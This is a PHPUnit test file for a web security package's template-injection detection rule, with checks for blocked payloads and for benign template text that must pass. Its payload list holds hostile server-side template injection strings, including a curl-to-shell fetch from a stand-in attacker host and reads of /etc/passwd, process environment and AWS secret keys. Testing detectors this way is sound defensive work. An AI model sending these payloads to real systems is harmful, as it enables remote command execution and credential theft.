<?php

declare(strict_types=1);

namespace Mixudev\SecurityDefense\Tests\Feature\Adversarial\Signature;

use PHPUnit\Framework\Attributes\DataProvider;
use Mixudev\SecurityDefense\Tests\TestCase;

/**
 * Template injection is enabled by default because its signatures target
 * executable helper names inside expression delimiters, not ordinary braces.
 * The benign corpus documents the boundary: template examples and harmless
 * interpolation are common content and must remain accepted.
 */
class TemplateInjectionSignatureRuleTest extends TestCase
{
    use ConfiguresSignatureRules;

    protected function setUp(): void
    {
        parent::setUp();
        $this->setUpSignatureProbe();
        $this->enableSignature('template_injection');
    }

    #[DataProvider('templatePayloadProvider')]
    public function test_template_injection_payload_is_blocked(string $payload): void
    {
        $result = $this->probeForm('template', $payload, '198.18.30.1');
        $this->assertSame(403, $result['status'], "Template injection bypassed: {$payload}");
    }

    #[DataProvider('templatePayloadProvider')]
    public function test_template_injection_json_payload_is_blocked(string $payload): void
    {
        $result = $this->probeJson('template', $payload, '198.18.30.2');
        $this->assertSame(403, $result['status'], "JSON template injection bypassed: {$payload}");
    }

    /** @return array<string, array{0: string}> */
    public static function templatePayloadProvider(): array
    {
        return [
            'twig system' => ['{{ system("id") }}'],
            'twig exec' => ['{{ exec("whoami") }}'],
            'twig passthru' => ['{{ passthru("cat /etc/passwd") }}'],
            'twig shell exec' => ['{{ shell_exec("uname -a") }}'],
            'twig phpinfo' => ['{{ phpinfo() }}'],
            'blade system' => ['{{ system("id") }}'],
            'freemarker exec' => ['${exec("id")}'],
            'freemarker cmd' => ['${cmd("whoami")}'],
            'expression env' => ['${env("AWS_SECRET_ACCESS_KEY")}'],
            'expression nested exec' => ['${user.name + exec("id")}'],
            'spaced twig system' => ['{{  system ( "id" ) }}'],
            'multiline expression' => ["{{\nshell_exec(\"id\")\n}}"],
            'mixed case helper' => ['{{ SyStEm("id") }}'],
            'template command chain' => ['{{ system("curl http://evil.test | sh") }}'],
            'template file read' => ['{{ exec("cat /proc/self/environ") }}'],
        ];
    }

    public function test_benign_template_text_is_not_blocked(): void
    {
        foreach ([
            '{{ customer_name }}',
            '{{ total }} USD',
            'Hello {{ name }}, welcome back',
            '${firstName} ${lastName}',
            '{{ product.description }}',
            'Use {{variable}} in the documentation',
            'The word system appears in prose',
            'shell_exec is mentioned in a security guide',
            'Template: {{ 1 + 2 }}',
            '<p>{{ order.number }}</p>',
        ] as $text) {
            $result = $this->probeForm('template', $text, '198.18.30.3');
            $this->assertSame(200, $result['status'], "Template false positive: {$text}");
        }
    }

    /**
     * Disabling the category must not open a hole for payloads another enabled
     * signature already owns: eval_based matches `system(` independently of the
     * template delimiters.
     */
    public function test_template_rule_can_be_disabled_explicitly(): void
    {
        config()->set('security-defense.detection.rules.payload_injection.patterns.template_injection', false);

        $result = $this->probeForm('template', '${env("AWS_SECRET_ACCESS_KEY")}', '198.18.30.4');
        $this->assertSame(200, $result['status'], 'Disabled template_injection must not block its own corpus.');

        $blocked = $this->probeForm('template', '{{ system("id") }}', '198.18.30.5');
        $this->assertSame(
            403,
            $blocked['status'],
            'eval_based must still catch system() when template_injection is off (defense in depth).'
        );
    }
}
